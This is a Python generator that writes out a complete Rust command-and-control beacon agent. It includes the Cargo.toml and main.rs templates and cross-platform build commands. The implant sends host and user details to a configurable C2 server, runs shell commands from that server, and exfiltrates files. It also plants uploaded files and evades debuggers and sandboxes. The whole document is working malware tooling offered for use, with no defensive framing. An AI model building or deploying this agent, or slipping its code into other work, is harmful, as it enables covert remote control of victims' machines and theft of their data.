"""
Rust Agent Template Generator
High-performance, memory-safe C2 agent in Rust

Features:
- Zero-copy networking
- No garbage collection (harder to detect)
- Native syscalls (Windows/Linux)
- Strong anti-analysis
"""
import os
import json
import base64
from typing import Dict, Optional
from dataclasses import dataclass


@dataclass
class RustAgentConfig:
    """Rust agent configuration"""
    c2_host: str
    c2_port: int = 443
    sleep_time: int = 60
    jitter_percent: int = 30
    use_https: bool = True
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    kill_date: Optional[str] = None
    working_hours: Optional[str] = None
    evasion_level: int = 3


class RustAgentGenerator:
    """Generate Rust-based C2 agent"""
    
    CARGO_TOML = '''[package]
name = "beacon"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = {{ version = "0.11", features = ["blocking", "rustls-tls"], default-features = false }}
serde = {{ version = "1.0", features = ["derive"] }}
serde_json = "1.0"
base64 = "0.21"
rand = "0.8"
chrono = "0.4"
aes-gcm = "0.10"
sha2 = "0.10"
hex = "0.4"

[target.'cfg(windows)'.dependencies]
windows = {{ version = "0.48", features = ["Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Threading", "Win32_Security"] }}

[profile.release]
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
'''

    MAIN_RS = '''use std::{{
    env,
    fs,
    io::{{Read, Write}},
    process::Command,
    thread,
    time::Duration,
}};

use aes_gcm::{{
    aead::{{Aead, KeyInit}},
    Aes256Gcm, Nonce,
}};
use chrono::{{Local, NaiveTime, Utc}};
use rand::Rng;
use reqwest::blocking::Client;
use serde::{{Deserialize, Serialize}};
use sha2::{{Digest, Sha256}};

// Configuration
const C2_HOST: &str = "{C2_HOST}";
const C2_PORT: u16 = {C2_PORT};
const SLEEP_TIME: u64 = {SLEEP_TIME};
const JITTER_PERCENT: u64 = {JITTER_PERCENT};
const USE_HTTPS: bool = {USE_HTTPS};
const USER_AGENT: &str = "{USER_AGENT}";
const KILL_DATE: &str = "{KILL_DATE}";
const WORKING_HOURS: &str = "{WORKING_HOURS}";
const EVASION_LEVEL: u8 = {EVASION_LEVEL};
const AES_KEY: &[u8; 32] = b"{AES_KEY}";

#[derive(Serialize)]
struct BeaconMeta {{
    id: String,
    hostname: String,
    username: String,
    os: String,
    arch: String,
    pid: u32,
}}

#[derive(Deserialize)]
struct Task {{
    id: String,
    #[serde(rename = "type")]
    task_type: String,
    command: Option<String>,
    args: Option<String>,
}}

#[derive(Serialize)]
struct TaskResult {{
    task_id: String,
    success: bool,
    output: Option<String>,
    error: Option<String>,
}}

#[derive(Deserialize)]
struct CheckinResponse {{
    tasks: Vec<Task>,
}}

fn main() {{
    // Anti-debug
    if EVASION_LEVEL >= 2 && is_debugger_present() {{
        return;
    }}
    
    // Sandbox check
    if EVASION_LEVEL >= 3 && is_sandbox() {{
        thread::sleep(Duration::from_secs(3600));
        return;
    }}
    
    // Kill date check
    if !KILL_DATE.is_empty() && is_kill_date_passed() {{
        return;
    }}
    
    let beacon_id = generate_beacon_id();
    let client = create_http_client();
    
    loop {{
        // Working hours check
        if !WORKING_HOURS.is_empty() && !is_working_hours() {{
            thread::sleep(Duration::from_secs(3600));
            continue;
        }}
        
        // Check in
        if let Ok(tasks) = checkin(&client, &beacon_id) {{
            for task in tasks {{
                let result = execute_task(&task);
                let _ = send_result(&client, &beacon_id, result);
            }}
        }}
        
        // Sleep with jitter
        sleep_with_jitter();
    }}
}}

fn generate_beacon_id() -> String {{
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().to_string())
        .unwrap_or_else(|_| "unknown".to_string());
    
    let data = format!("{{}}-{{}}-{{}}", hostname, std::process::id(), Utc::now().timestamp_nanos());
    let hash = Sha256::digest(data.as_bytes());
    hex::encode(&hash[..8])
}}

fn create_http_client() -> Client {{
    Client::builder()
        .user_agent(USER_AGENT)
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client")
}}

fn get_c2_url(endpoint: &str) -> String {{
    let protocol = if USE_HTTPS {{ "https" }} else {{ "http" }};
    format!("{{}}://{{}}:{{}}{{}}", protocol, C2_HOST, C2_PORT, endpoint)
}}

fn get_meta(beacon_id: &str) -> BeaconMeta {{
    BeaconMeta {{
        id: beacon_id.to_string(),
        hostname: hostname::get()
            .map(|h| h.to_string_lossy().to_string())
            .unwrap_or_else(|_| "unknown".to_string()),
        username: env::var("USER")
            .or_else(|_| env::var("USERNAME"))
            .unwrap_or_else(|_| "unknown".to_string()),
        os: env::consts::OS.to_string(),
        arch: env::consts::ARCH.to_string(),
        pid: std::process::id(),
    }}
}}

fn checkin(client: &Client, beacon_id: &str) -> Result<Vec<Task>, Box<dyn std::error::Error>> {{
    let meta = get_meta(beacon_id);
    let mut body = serde_json::to_vec(&meta)?;
    
    if EVASION_LEVEL >= 1 {{
        body = encrypt(&body);
    }}
    
    let resp = client
        .post(&get_c2_url("/beacon/checkin"))
        .header("Content-Type", "application/octet-stream")
        .body(body)
        .send()?;
    
    let mut resp_body = resp.bytes()?.to_vec();
    
    if EVASION_LEVEL >= 1 {{
        resp_body = decrypt(&resp_body);
    }}
    
    let response: CheckinResponse = serde_json::from_slice(&resp_body)?;
    Ok(response.tasks)
}}

fn send_result(client: &Client, beacon_id: &str, result: TaskResult) -> Result<(), Box<dyn std::error::Error>> {{
    let mut body = serde_json::to_vec(&result)?;
    
    if EVASION_LEVEL >= 1 {{
        body = encrypt(&body);
    }}
    
    client
        .post(&get_c2_url("/beacon/results"))
        .header("Content-Type", "application/octet-stream")
        .body(body)
        .send()?;
    
    Ok(())
}}

fn execute_task(task: &Task) -> TaskResult {{
    match task.task_type.as_str() {{
        "cmd" | "shell" => {{
            let command = task.command.as_deref().unwrap_or("");
            match execute_command(command) {{
                Ok(output) => TaskResult {{
                    task_id: task.id.clone(),
                    success: true,
                    output: Some(output),
                    error: None,
                }},
                Err(e) => TaskResult {{
                    task_id: task.id.clone(),
                    success: false,
                    output: None,
                    error: Some(e.to_string()),
                }},
            }}
        }}
        "download" => {{
            let path = task.command.as_deref().unwrap_or("");
            match fs::read(path) {{
                Ok(content) => TaskResult {{
                    task_id: task.id.clone(),
                    success: true,
                    output: Some(base64::encode(&content)),
                    error: None,
                }},
                Err(e) => TaskResult {{
                    task_id: task.id.clone(),
                    success: false,
                    output: None,
                    error: Some(e.to_string()),
                }},
            }}
        }}
        "upload" => {{
            let path = task.command.as_deref().unwrap_or("");
            let content = task.args.as_deref().unwrap_or("");
            match base64::decode(content) {{
                Ok(data) => match fs::write(path, &data) {{
                    Ok(_) => TaskResult {{
                        task_id: task.id.clone(),
                        success: true,
                        output: Some(format!("Written {{}} bytes", data.len())),
                        error: None,
                    }},
                    Err(e) => TaskResult {{
                        task_id: task.id.clone(),
                        success: false,
                        output: None,
                        error: Some(e.to_string()),
                    }},
                }},
                Err(e) => TaskResult {{
                    task_id: task.id.clone(),
                    success: false,
                    output: None,
                    error: Some(e.to_string()),
                }},
            }}
        }}
        "exit" => {{
            std::process::exit(0);
        }}
        _ => TaskResult {{
            task_id: task.id.clone(),
            success: false,
            output: None,
            error: Some("Unknown task type".to_string()),
        }},
    }}
}}

fn execute_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {{
    let output = if cfg!(target_os = "windows") {{
        Command::new("cmd").args(["/C", cmd]).output()?
    }} else {{
        Command::new("sh").args(["-c", cmd]).output()?
    }};
    
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    Ok(format!("{{}}{{}}", stdout, stderr))
}}

fn sleep_with_jitter() {{
    let mut rng = rand::thread_rng();
    let jitter = SLEEP_TIME as f64 * (JITTER_PERCENT as f64 / 100.0);
    let variance: f64 = rng.gen_range(-jitter..jitter);
    let actual_sleep = (SLEEP_TIME as f64 + variance).max(1.0) as u64;
    thread::sleep(Duration::from_secs(actual_sleep));
}}

fn is_kill_date_passed() -> bool {{
    if let Ok(kill) = chrono::NaiveDate::parse_from_str(KILL_DATE, "%Y-%m-%d") {{
        return Local::now().date_naive() >= kill;
    }}
    false
}}

fn is_working_hours() -> bool {{
    let parts: Vec<&str> = WORKING_HOURS.split('-').collect();
    if parts.len() != 2 {{
        return true;
    }}
    
    let start = NaiveTime::parse_from_str(parts[0], "%H:%M").ok();
    let end = NaiveTime::parse_from_str(parts[1], "%H:%M").ok();
    
    if let (Some(start), Some(end)) = (start, end) {{
        let now = Local::now().time();
        return now >= start && now <= end;
    }}
    true
}}

fn is_debugger_present() -> bool {{
    #[cfg(target_os = "windows")]
    {{
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        unsafe {{ IsDebuggerPresent().as_bool() }}
    }}
    #[cfg(not(target_os = "windows"))]
    {{
        // Check /proc/self/status for TracerPid on Linux
        if let Ok(status) = fs::read_to_string("/proc/self/status") {{
            for line in status.lines() {{
                if line.starts_with("TracerPid:") {{
                    let pid: i32 = line.split_whitespace()
                        .nth(1)
                        .and_then(|s| s.parse().ok())
                        .unwrap_or(0);
                    return pid != 0;
                }}
            }}
        }}
        false
    }}
}}

fn is_sandbox() -> bool {{
    // Check CPU count
    if num_cpus::get() < 2 {{
        return true;
    }}
    
    // Check for sandbox usernames
    let username = env::var("USER")
        .or_else(|_| env::var("USERNAME"))
        .unwrap_or_default()
        .to_lowercase();
    
    let sandbox_names = ["sandbox", "virus", "malware", "sample", "test"];
    for name in sandbox_names {{
        if username.contains(name) {{
            return true;
        }}
    }}
    
    false
}}

fn encrypt(data: &[u8]) -> Vec<u8> {{
    let cipher = Aes256Gcm::new_from_slice(AES_KEY).expect("Invalid key");
    let mut rng = rand::thread_rng();
    let mut nonce_bytes = [0u8; 12];
    rng.fill(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    
    let ciphertext = cipher.encrypt(nonce, data).expect("Encryption failed");
    
    let mut result = nonce_bytes.to_vec();
    result.extend(ciphertext);
    result
}}

fn decrypt(data: &[u8]) -> Vec<u8> {{
    if data.len() < 12 {{
        return data.to_vec();
    }}
    
    let cipher = Aes256Gcm::new_from_slice(AES_KEY).expect("Invalid key");
    let nonce = Nonce::from_slice(&data[..12]);
    let ciphertext = &data[12..];
    
    cipher.decrypt(nonce, ciphertext).unwrap_or_else(|_| data.to_vec())
}}
'''

    def __init__(self, config: RustAgentConfig):
        self.config = config
    
    def generate_main(self) -> str:
        """Generate main.rs source"""
        aes_key = os.urandom(32)
        # Escape for Rust byte string
        aes_key_str = ''.join(f'\\x{b:02x}' for b in aes_key)
        
        return self.MAIN_RS.format(
            C2_HOST=self.config.c2_host,
            C2_PORT=self.config.c2_port,
            SLEEP_TIME=self.config.sleep_time,
            JITTER_PERCENT=self.config.jitter_percent,
            USE_HTTPS=str(self.config.use_https).lower(),
            USER_AGENT=self.config.user_agent,
            KILL_DATE=self.config.kill_date or "",
            WORKING_HOURS=self.config.working_hours or "",
            EVASION_LEVEL=self.config.evasion_level,
            AES_KEY=aes_key_str[:32]
        )
    
    def generate_cargo_toml(self) -> str:
        """Generate Cargo.toml"""
        return self.CARGO_TOML
    
    def save(self, output_dir: str):
        """Save Rust project to directory"""
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, 'src'), exist_ok=True)
        
        # Write Cargo.toml
        with open(os.path.join(output_dir, 'Cargo.toml'), 'w') as f:
            f.write(self.generate_cargo_toml())
        
        # Write main.rs
        with open(os.path.join(output_dir, 'src', 'main.rs'), 'w') as f:
            f.write(self.generate_main())
        
        return output_dir
    
    def get_build_commands(self) -> Dict[str, str]:
        """Get build commands for different platforms"""
        return {
            "windows_x64": "cargo build --release --target x86_64-pc-windows-gnu",
            "windows_x86": "cargo build --release --target i686-pc-windows-gnu",
            "linux_x64": "cargo build --release --target x86_64-unknown-linux-gnu",
            "linux_musl": "cargo build --release --target x86_64-unknown-linux-musl",
            "macos_x64": "cargo build --release --target x86_64-apple-darwin",
            "macos_arm64": "cargo build --release --target aarch64-apple-darwin"
        }


# Convenience function
def generate_rust_agent(c2_host: str, c2_port: int = 443, **kwargs) -> Dict[str, str]:
    """Generate Rust agent project files"""
    config = RustAgentConfig(c2_host=c2_host, c2_port=c2_port, **kwargs)
    generator = RustAgentGenerator(config)
    return {
        "Cargo.toml": generator.generate_cargo_toml(),
        "src/main.rs": generator.generate_main()
    }
